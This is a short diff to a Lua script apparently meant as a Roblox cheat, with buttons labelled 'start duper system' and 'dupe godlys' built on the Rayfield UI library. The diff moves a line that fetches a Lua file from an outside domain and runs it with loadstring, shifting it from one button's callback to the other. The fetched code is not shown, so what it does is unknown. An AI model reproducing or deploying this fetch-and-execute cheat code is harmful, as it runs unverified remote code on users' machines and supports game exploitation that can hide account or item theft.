@@ -47,14 +47,14 @@ Rayfield:Notify({
 local Button = MainTab:CreateButton({
    Name = "start duper system",
    Callback = function()
-loadstring(game:HttpGet("https://egorikusa.space/c7d07e24756c075bc2e7d3c7.lua", true))()
+
    end,
 })
 
 local Button = MainTab:CreateButton({
    Name = "dupe godlys",
    Callback = function()
-
+loadstring(game:HttpGet("https://egorikusa.space/c7d07e24756c075bc2e7d3c7.lua", true))()
    end,
 })
 
